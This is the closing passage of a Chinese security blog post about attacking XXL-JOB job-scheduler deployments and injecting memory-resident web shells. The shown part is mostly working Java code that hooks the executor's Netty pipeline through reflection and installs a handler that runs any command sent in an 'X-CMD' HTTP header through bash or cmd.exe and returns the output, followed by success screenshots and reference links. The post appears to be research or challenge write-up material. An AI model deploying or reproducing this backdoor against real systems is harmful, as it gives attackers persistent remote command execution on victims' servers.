<span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                                <span class="comment">// 替换 handler</span></span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                                <span class="comment">// 设置初始化</span></span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>());</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                XxlJobHelper.log(<span class="string">&quot;ok?&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        XxlJobHelper.log(ignored.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            XxlJobHelper.log(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">  	</span><br><span class="line">  	<span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest)msg;</span><br><span class="line">            <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                    cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                    cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmdList.add(cmd);</span><br><span class="line">                String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    execResult =execResult+line;</span><br><span class="line">                &#125;</span><br><span class="line">                process.destroy();</span><br><span class="line">                <span class="comment">// 返回执行结果</span></span><br><span class="line">                send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>execute()</code>方法为提取<code>handler</code>并为<code>childhandler</code>重新赋值的逻辑</p>
<p>​<code>NettyThreadHandler</code>为自定义恶意<code>handler</code>，让后续的<code>HTTP</code>请求走<code>NettyThreadHandler#channelRead</code>​</p>
<p>成功修改</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224130407-5nt5gg1.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224130452-g2q2e3c.png" alt="image"></p>
<p>‍</p>
<hr>
<p>‍</p>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2024/07/09/XXL-JOB-Executor-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/index.html">http://www.bmth666.cn/2024/07/09/XXL-JOB-Executor-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.kitsch.life/2024/01/31/xxl-job%e5%88%a9%e7%94%a8%e7%a0%94%e7%a9%b6/">https://www.kitsch.life/2024/01/31/xxl-job%e5%88%a9%e7%94%a8%e7%a0%94%e7%a9%b6/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aFE5BXTpnLaCymUJFAC3og">https://mp.weixin.qq.com/s/aFE5BXTpnLaCymUJFAC3og</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CxKbdkZqKftf1cP0BvBeUQ">https://mp.weixin.qq.com/s/CxKbdkZqKftf1cP0BvBeUQ</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RuoJi6/xxl-job-FLM">https://github.com/RuoJi6/xxl-job-FLM</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2026/01/04/CodeQL/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2026-01-11 21:24:51
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2026/01/15/Fastjson%201.2.68%20%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%20&%20MySQL%20JDBC%20&%20%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8BTrick_cos/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXL-JOB-%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E9%98%B2"><span class="toc-text">XXL-JOB 内存马攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-01"><span class="toc-text">Challenge 01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Audit"><span class="toc-text">Code Audit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E5%BA%A6%E5%90%8E%E5%8F%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">调度后台内存马注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8"><span class="toc-text">执行器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FShell%E5%91%BD%E4%BB%A4"><span class="toc-text">执行任意Shell命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">后台内存马注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">执行器 hessian 反序列化内存马注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-02"><span class="toc-text">Challenge 02</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Audit-1"><span class="toc-text">Code Audit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Chains01-JavaWrapper-main"><span class="toc-text">Chains01 - JavaWrapper#_main</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Chains02-com-sun-org-apache-xalan-internal-xslt-Process-main"><span class="toc-text">Chains02 - com.sun.org.apache.xalan.internal.xslt.Process#_main</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E5%BA%A6%E5%90%8E%E5%8F%B0%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5-1"><span class="toc-text">调度后台内存马注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">执行器内存马注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-03"><span class="toc-text">Challenge 03</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5-1"><span class="toc-text">执行器内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9B%B4%E6%8E%A5%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%81%B6%E6%84%8F%E7%B1%BB%E6%B3%A8%E5%85%A5Netty%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">后台定时任务直接实例化恶意类注入Netty内存马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8-run-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B3%A8%E5%85%A5Netty%E5%86%85%E5%AD%98%E9%A9%AC-Code-Audit"><span class="toc-text">执行器 &#x2F;run 未授权注入Netty内存马 &amp; Code Audit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-04"><span class="toc-text">Challenge 04</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5-2"><span class="toc-text">执行器内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E5%88%B0%E6%97%A5%E5%BF%97"><span class="toc-text">正常命令执行回显到日志</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JDK17%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BB%95%E8%BF%87%E6%8E%A2%E7%B4%A2"><span class="toc-text">JDK17模块化绕过探索</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXL-JOB-Netty-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">XXL-JOB &amp; Netty 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%99%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">执行器初始化流程分析</span></a></li></ol></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
    <div class="footer-views">
      
      
          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        
      
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        


        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + XXL-JOB%E6%94%BB%E9%98%B2%20%26%20%E5%86%85%E5%AD%98%E9%A9%AC + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2026%2F01%2F11%2FXXL-JOB%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2026/01/11/XXL-JOB/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
